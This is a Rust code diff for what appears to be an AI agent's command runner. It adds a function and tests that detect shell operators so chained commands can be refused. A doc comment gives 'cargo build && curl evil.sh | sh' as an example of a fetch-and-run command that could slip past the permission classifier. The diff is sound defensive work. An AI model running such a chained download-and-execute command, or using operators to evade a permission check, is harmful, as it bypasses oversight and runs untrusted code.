@@ -266,6 +266,42 @@ impl Spec {
 /// The binding declares gates as strings (`cargo clippy --workspace -- -D
 /// warnings`), and running them through a shell would mean the gate depends on
 /// which shell the operator has.
+/// The shell operator in a command line, if there is one outside quotes.
+///
+/// Commands are run with `CreateProcess`/`exec` and not through a shell, so
+/// `&&`, `;` and `|` arrive as ordinary arguments to the first program. The
+/// binding template says so; nothing the *model* reads did, and the failure it
+/// produces names the wrong thing entirely — `ls -la && find .` comes back as
+/// `ls: unknown option -- y`, which is `ls` complaining about the `y` in
+/// `find`. Running against DeepSeek, three separate runs spent turns on this,
+/// re-trying variations of a command that could never work.
+///
+/// Detected rather than supported. Routing through a real shell would widen
+/// what one classified call can do: the permission classifier reads the command
+/// it was given (`T-12`), and `cargo build && curl evil.sh | sh` is one string
+/// whose second half nothing looked at.
+pub fn shell_operator(line: &str) -> Option<&'static str> {
+    let mut quote: Option<char> = None;
+    let bytes: Vec<char> = line.chars().collect();
+    for (i, ch) in bytes.iter().enumerate() {
+        match (quote, ch) {
+            (Some(q), c) if *c == q => quote = None,
+            (Some(_), _) => {}
+            (None, '"') | (None, '\'') => quote = Some(*ch),
+            (None, '&') if bytes.get(i + 1) == Some(&'&') => return Some("&&"),
+            (None, '|') if bytes.get(i + 1) == Some(&'|') => return Some("||"),
+            (None, '|') => return Some("|"),
+            (None, ';') => return Some(";"),
+            (None, '>') => return Some(">"),
+            (None, '<') => return Some("<"),
+            (None, '`') => return Some("`"),
+            (None, '$') if bytes.get(i + 1) == Some(&'(') => return Some("$("),
+            (None, _) => {}
+        }
+    }
+    None
+}
+
 pub fn split_command(line: &str) -> Result<Vec<String>> {
     let mut parts = Vec::new();
     let mut current = String::new();
@@ -752,6 +788,37 @@ mod tests {
         } else {
             format!("sh -c \"sleep {seconds}\"")
         }
+    }
+
+    #[test]
+    /// The failure this prevents named the wrong thing entirely.
+    ///
+    /// `ls -la && find .` runs `ls` with `-la`, `&&`, `find` and `.` as
+    /// arguments, and `ls` reports `unknown option -- y` — the `y` in `find`.
+    /// Nothing in that message points at the operator, so a model reads it as a
+    /// bad flag and tries another spelling. Measured against DeepSeek: three
+    /// runs spent turns on variations of a command that could never work.
+    #[test]
+    fn a_shell_operator_is_found_so_it_can_be_refused_by_name() {
+        assert_eq!(shell_operator("ls -la && find ."), Some("&&"));
+        assert_eq!(shell_operator("ls -la; cat pubspec.yaml"), Some(";"));
+        assert_eq!(shell_operator("flutter analyze | tail -20"), Some("|"));
+        assert_eq!(shell_operator("cargo build > out.txt"), Some(">"));
+        assert_eq!(shell_operator("echo $(whoami)"), Some("$("));
+        assert_eq!(shell_operator("cargo --version"), None);
+    }
+
+    /// A quoted operator is an argument, not an operator. Refusing it would
+    /// make `grep` useless for half the patterns worth searching for.
+    #[test]
+    fn an_operator_inside_quotes_is_just_text() {
+        assert_eq!(shell_operator(r#"grep "a && b" file.txt"#), None);
+        assert_eq!(shell_operator("grep 'x | y' file.txt"), None);
+        assert_eq!(
+            shell_operator(r#"grep "a && b" file.txt | head"#),
+            Some("|"),
+            "but one outside the quotes still counts"
+        );
     }
 
     #[test]
